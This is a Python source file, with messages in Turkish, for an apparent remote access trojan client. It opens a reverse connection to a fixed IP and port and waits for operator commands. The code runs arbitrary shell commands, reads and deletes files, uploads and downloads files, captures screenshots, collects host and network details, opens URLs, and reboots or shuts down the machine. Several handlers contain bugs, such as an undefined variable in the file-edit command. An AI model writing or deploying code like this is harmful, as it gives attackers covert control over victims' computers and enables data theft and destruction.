import socket
import subprocess
import os
import psutil
from psutil._common import bytes2human
import platform
import webbrowser
import pyautogui


def os_info():
    info = {
    'İşletim Sistemi': platform.system(),
    'Python Version': platform.python_version(),
    'Bit Version': platform.machine(),
    'HostName': socket.gethostbyname(socket.gethostname()),
    'Login Name': os.getlogin(),
    'OS Name': os.name,

    }
    return info

def get_cpu_info():
    cpu_info = ""
    for num, percent in enumerate(psutil.cpu_percent(percpu=True)):
        cpu_info += f"CPU{num}: {percent}%\n"
    return cpu_info

def get_memory_info():
    try:
        result = subprocess.run(['free'], capture_output=True, shell=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Error: {result.stderr.strip()}"
    except Exception as e:
        return f"Error: {str(e)}"
        
def get_network_info():
    network_info = ""
    af_map = {
        socket.AF_INET: 'IPv4',
        socket.AF_INET6: 'IPv6',
    }
    interfaces = psutil.net_if_addrs()
    for interface, addresses in interfaces.items():
        network_info += f"Ağ Arayüzü: {interface}\n"
        for addr in addresses:
            network_info += f"  Adres Türü: {af_map.get(addr.family, addr.family)}\n"
            network_info += f"  Adres: {addr.address}\n"
            if addr.broadcast:
                network_info += f"    Yayın Adresi: {addr.broadcast}\n"
            if addr.netmask:
                network_info += f"    Ağ Maskesi: {addr.netmask}\n"
    return network_info

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Error: {result.stderr.strip()}"
    except Exception as e:
        return f"Error: {str(e)}"
        

def main():
    ip = '192.168.1.36' 
    port = 4545  

    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            print("Sunucuya bağlanıldı.")
        
            while True:
                command = s.recv(8192).decode()
                
                if not command:
                    continue

                if command == 'exit':
                    break

                elif command == 'execute':
                    komut = s.recv(8192).decode()
                    output = execute_command(komut)
                    s.send(output.encode())

                elif command.startswith('openfile'):
                    dosya_adi = command.split(" ", 1)[1]
                    try:
                        with open(dosya_adi, "r") as dosya:
                            icerik = dosya.read()
                        s.sendall(icerik.encode())
                    except FileNotFoundError:
                        s.send("Dosya bulunamadı".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())

                elif command.startswith('deletefile'):
                    dosya_adi = command.split(" ", 1)[1]
                    try:
                        os.remove(dosya_adi)
                        s.send(f"{dosya_adi} başarıyla silindi.".encode())
                    except FileNotFoundError:
                        s.send(f"{dosya_adi} bulunamadı".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())

                elif command.startswith('deletedirectory'):
                    hedef_dizin = command.split(" ", 1)[1]
                    try:
                        os.rmdir(hedef_dizin)
                        s.send(f"{hedef_dizin} başarıyla silindi.".encode())
                    except FileNotFoundError:
                        s.send(f"{hedef_dizin} bulunamadı".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())
                    
                elif command.startswith('ls') or command.startswith('dir'):
                    dosyalar = os.listdir()
                    if dosyalar:
                        s.send("\n".join(dosyalar).encode())
                    else:
                        s.send("Dizin boş".encode())

                elif command.startswith('cd'):
                    hedefklasor = command.split(" ", 1)[1]
                    try:
                        os.chdir(hedefklasor)
                        s.send(f"Dizin değiştirildi: {os.getcwd()}".encode())
                    except FileNotFoundError:
                        s.send("Hata: Dizin bulunamadı".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())

                elif command.startswith('createdirectory'):
                    hedefklasor = command.split(" ", 1)[1]
                    try:
                        os.mkdir(hedefklasor)
                        s.send(f"{hedefklasor} başarıyla oluşturuldu.".encode())
                    except FileExistsError:
                        s.send(f"{hedefklasor} zaten var.".encode())
                    except Exception as e:
                        s.send(f"Hata: {str(e)}".encode())

                elif command.startswith("createfile"):
                    dosyaisim = command.split(" ", 1)[1]
                    with open(dosyaisim, "w") as dosya:
                        pass
                    s.send("Dosya oluşturuldu.".encode())
            
                elif command.startswith("editfile"):
                    komut_parcalari = command.split(" ")
                    dosya_isim_index = komut_parcalari.index(">>") + 1
                    dosya_isim = komut_parcalari[dosya_isim_index]
                    metin = " ".join(komut_parcalari[1:dosya_isim_index-1])
                    with open(dosyaisim, "a") as dosya:
                        dosya.write(metin)
                    s.send("Metin dosya sonuna eklendi.".encode())
                    
                
    
                    

                elif command == "whoami":
                    cikti = subprocess.run
                    cikti = subprocess.run(['whoami'], capture_output=True, text=True)
                    s.send(cikti.stdout.encode())
                
                elif command == "ifconfig":
                    x = get_network_info()
                    s.send(x.encode())
                
                elif command == "cpu":
                    x = get_cpu_info()
                    s.send(x.encode())
                
                elif command == "memory":
                    x = get_memory_info()
                    s.send(x)
                
                elif command == "osinfo":
                    os_info = os_info()
                    formatted_str = ""
                    for key, value in os_info.items():
                        formatted_str += f"{key}: {value}\n"
                        os_info = formatted_str
                    s.send(str(os_info).encode())
                    
                elif command == 'upload':
                    dosya_adi = s.recv(8192).decode()
                    with open(dosya_adi, 'wb') as file:
                        while True:
                            data = s.recv(8192)
                            if data.endswith('UPLOAD_COMPLETE'.encode()):
                                file.write(data[:-len('UPLOAD_COMPLETE'.encode())])
                                break
                            file.write(data)
                            
                        
                elif command == 'download':
                    dosya_adi = s.recv(8192).decode()
                    try:
                        with open(dosya_adi, 'rb') as file:
                            while (data := file.read(819229383)):
                                if not data:
                                    s.send('Dosya boş'.encode())
                                    continue
                                else:    
                                    s.send(data)
                                    s.send('DOWNLOAD_COMPLETE'.encode())
                    except FileNotFoundError:
                        s.send('HATA: Dosya bulunamadı.'.encode())
        
                elif command == 'screenshot':
                    screenshot = pyautogui.screenshot()
                    screenshot.save("hacked.png")
                    with open("hacked.png", 'rb') as file:
                        while True:
                            file_data = file.read(8192)
                            if not file_data:
                                break
                            s.send(file_data)
                    os.remove("hacked.png")
                    s.send("screenshot_complete".encode())
                    
                elif command.startswith('browser'):
                    link = command.split(" ", 1)[1]
                    if not link.startswith(("http://", "https://")):
                        link = "http://" + link
                    try:
                        webbrowser.open(link)
                        s.send('Url Açıldı.'.encode())
                    except Exception as e:
                        s.send(f'Url açılırken hata oluştu: {str(e)}'.encode())
                        
                elif command == 'restart':
                    x = os.name
                    if x == 'posix':
                        result = subprocess.run(['sudo', 'reboot'], shell=True, capture_output=True, text=True)
                    elif x == 'nt':
                        result = subprocess.run(['shutdown', '/r', '/t', '0'], shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0:  
                        s.send(result.stdout.strip().encode())
                    else:
                        s.send(result.stderr.strip().encode())
                        
                elif command == 'poweroff':
                    x = os.name
                    if x == 'posix':
                        result = subprocess.run(['shutdown', '-h', 'now'], shell=True, capture_output=True, text=True)
                    elif x == 'nt':
                        result = subprocess.run(['shutdown', '/s'], shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0:  
                        s.send(result.stdout.strip().encode())
                    else:
                        s.send(result.stderr.strip().encode())
                        
                        
                             
    print("Bağlantı kesildi.")

if __name__ == "__main__":
    main()
